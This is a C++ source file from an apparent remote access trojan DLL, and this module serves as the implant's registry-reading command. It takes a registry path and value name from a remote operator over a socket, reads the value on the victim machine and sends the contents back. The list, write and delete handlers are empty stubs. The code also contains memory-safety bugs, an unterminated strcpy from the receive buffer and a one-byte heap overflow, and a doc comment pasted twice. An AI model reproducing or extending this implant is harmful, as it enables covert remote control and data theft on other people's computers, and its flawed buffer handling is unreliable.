// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-RegRead.cpp : Defines functionality for performing a registry read on target, i.e., given a registry key and value name get the value

#include "RAT-Dll-Registry.h"
#include "RAT-Dll-Connect.h"
#include <iostream>
#include <cstring>


/** Handle socket work and function calls for performing registry reading functionality
params:
* clientSock - current open client socket to implant
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleRegRead(__in SOCKET clientSock)
{
	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
	CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];
	CHAR valueBuffer[DEFAULT_BUF_LEN];
	CHAR keyPathBuffer[DEFAULT_BUF_LEN];
	void* regValue = NULL;
	DWORD sizeRegValue = NULL;

	OutputDebugStringA("RAT-Dll-Registry::handleRegRead - Performing registry read...\n");

	// Receive our key path 
	status = recv(clientSock, recvBuf, recvBufLen, 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failed to recv (key path) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		goto cleanup; // keep trying to do things until we disconnect or receive a cleanup message
	}

	// Assign key path to separate buffer 
	strcpy(keyPathBuffer, recvBuf);

	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Received key path: %s\n", keyPathBuffer);
	OutputDebugStringA(msgBuf);

	// Get the value name
	status = recv(clientSock, recvBuf, recvBufLen, 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failed to recv (value name) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	strcpy(valueBuffer, recvBuf);

	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Received key value: %s\n", valueBuffer);
	OutputDebugStringA(msgBuf);

	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Performing reg read on path %s with key %s...\n", keyPathBuffer, valueBuffer);
	OutputDebugStringA(msgBuf);

	status = performRegRead(keyPathBuffer, valueBuffer, &regValue, &sizeRegValue);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failure recevied from performRegRead %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	status = sendSuccess(clientSock);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failure recevied from sendSuccess %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	// Send back the size of the key value we read 
	status = send(clientSock, (const char*)&sizeRegValue, sizeof(sizeRegValue), 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failure recevied from send (sizeRegValue) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	// Send back key data we got
	status = send(clientSock, (const char*)regValue, sizeRegValue, 0);
	if (status == SOCKET_ERROR)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegRead - Failure recevied from send (regValue) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}


cleanup:
	return status;
}


/** This function will perform a registry key read for us 
params:
* keypath - full path to the desired registry key we're reading from 
* valueName - name of the value we're reading from this key 
* regValue - void buffer to contain contents of our reg key 
* sizeRegValue - size of the regValue buffer 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performRegRead(__in char* keyPath, __in char* valueName, __out void** regValue, __out DWORD* sizeRegValue)
{
	INT status = SUCCESS;
	UINT32 stringLength = 0;
	HKEY hiveKeyValue = NULL, openRegKey = { 0 };
	CHAR msgBuf[DEFAULT_BUF_LEN], *hiveKey = NULL, *subKey = NULL;
	 

	// Split up the total keypath by hive and sub key path 
	subKey = strchr(keyPath, '\\');
	if (subKey == 0)
	{
		OutputDebugStringA("RAT-Dll-Registry::performRegRead - Failed to grab hive key!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Add 1 to skip the \ and just have our keypath
	subKey += 1;

	sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Registry key we're reading: %s\n", subKey);
	OutputDebugStringA(msgBuf);

	// Calculate length of the hive key 
	stringLength = (subKey-1) - keyPath;

	hiveKey = (char*)malloc(stringLength * sizeof(char));
	if (hiveKey == NULL)
	{
		OutputDebugStringA("RAT-Dll-Registry::performRegRead - Failed to alloc enough memory!\n");
		status = FAILURE;
		goto cleanup;
	}

	// Everything before this is our hive value (or should be)
	memcpy(hiveKey, keyPath, stringLength);
	
	// Need our explicit terminator at the end otherwise our strcmp will continue reading memory placed after our string, making our comparison below fail
	hiveKey[stringLength] = '\0';

	sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - User passed hive key: %s\n", hiveKey);
	OutputDebugStringA(msgBuf);

	hiveKeyValue = getHiveKey(hiveKey);
	if (hiveKeyValue == NULL)
	{
		OutputDebugStringA("RAT-Dll-Registry::performRegRead - Invalid hive key passed!\n");
		status = FAILURE;
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-Registry::performRegRead - Got hive key! Opening sub key...\n");

	status = RegOpenKeyExA(hiveKeyValue, subKey, 0, KEY_READ, &openRegKey);
	if (status != ERROR_SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegOpenKeyExA %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-Registry::performRegRead - Opened sub key! Grabbing value...\n");
	
	status = RegGetValueA(openRegKey, NULL, valueName, RRF_RT_ANY, NULL, *regValue, sizeRegValue);
	if (status == ERROR_MORE_DATA || status == ERROR_SUCCESS)
	{
		// We anticipate failure here so we can allocate bytes for our buffer as needed
		*regValue = (void*)malloc(*sizeRegValue);
		if (*regValue == NULL)
		{
			OutputDebugStringA("RAT-Dll-Registry::performRegRead - Could not allocate enough memory!\n");
			status = FAILURE;
			goto cleanup;
		}

		status = RegGetValueA(openRegKey, NULL, valueName, RRF_RT_ANY, NULL, *regValue, sizeRegValue);
		if (status != ERROR_SUCCESS)
		{
			sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegGetValueA %d\n", status);
			OutputDebugStringA(msgBuf);
			goto cleanup;
		}
	}
	
	// Yikes we got an unexpected error; bail
	else
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegGetValueA %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	status = RegCloseKey(openRegKey);
	if (status != ERROR_SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegCloseKey %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	// We check for success in our return so set that maybe
	status = SUCCESS;


cleanup:
	return status;
}

INT performRegList()
{
	INT status = SUCCESS;


cleanup: 
	return status;
}


INT performRegWrite()
{
	INT status = SUCCESS;


cleanup:
	return status;
}


/** This function will perform a registry key delete for us 
params:
* isKey - whether or not we're deleting a registry key (true) or a registry value (false)
* keypath - full path to the desired registry key we're reading from
* valueName - name of the value we're reading from this key
* regValue - void buffer to contain contents of our reg key
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*//** This function will perform a registry key read for us 
params:
* keypath - full path to the desired registry key we're reading from 
* valueName - name of the value we're reading from this key 
* regValue - void buffer to contain contents of our reg key 
* sizeRegValue - size of the regValue buffer 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performRegDelete(__in bool isKey)
{
	INT status = SUCCESS;

	// Check to see if we're deleting a key or value and make appropiate call 
	if (isKey)
	{
		// call performRegDeleteKey
	}

	else
	{
		// call performRegDeleteValue
	}



cleanup:
	return status;
}


/** Translates user passed hive key to actual value
params:
* hiveKey - buffer containing user desired hive key 
return:
* HKEY value of the hivekey; NULL otherwise 
*/
HKEY getHiveKey(__in char* hiveKey)
{
	CHAR msgBuf[DEFAULT_BUF_LEN];

	sprintf_s(msgBuf, "RAT-Dll-Registry::getHiveKey - Grabbing hive value for key: %s\n", hiveKey);
	OutputDebugStringA(msgBuf);

	if (strcmp(hiveKey, "HKEY_LOCAL_MACHINE") == 0 || strcmp(hiveKey, "HKLM") == 0)
	{
		return HKEY_LOCAL_MACHINE;
	}

	else if (strcmp(hiveKey, "HKEY_CLASSES_ROOT") == 0 || strcmp(hiveKey, "HKCR") == 0)
	{
		return HKEY_CLASSES_ROOT;
	}

	else if (strcmp(hiveKey, "HKEY_CURRENT_USER") == 0|| strcmp(hiveKey, "HKCU") == 0)
	{
		return HKEY_CURRENT_USER;
	}

	else if (strcmp(hiveKey, "HKEY_USERS") == 0 || strcmp(hiveKey, "HKU") == 0)
	{
		return HKEY_USERS;
	}

	else if (strcmp(hiveKey, "HKEY_CURRENT_CONFIG") == 0 || strcmp(hiveKey, "HKCC") == 0)
	{
		return HKEY_CURRENT_CONFIG;
	}

	// Dont care about performance stuff for now
	else
	{
		OutputDebugStringA("RAT-Dll-Registry::getHiveKey - Uncrecognized or unsupported hive key!\n");
		return NULL;
	}
}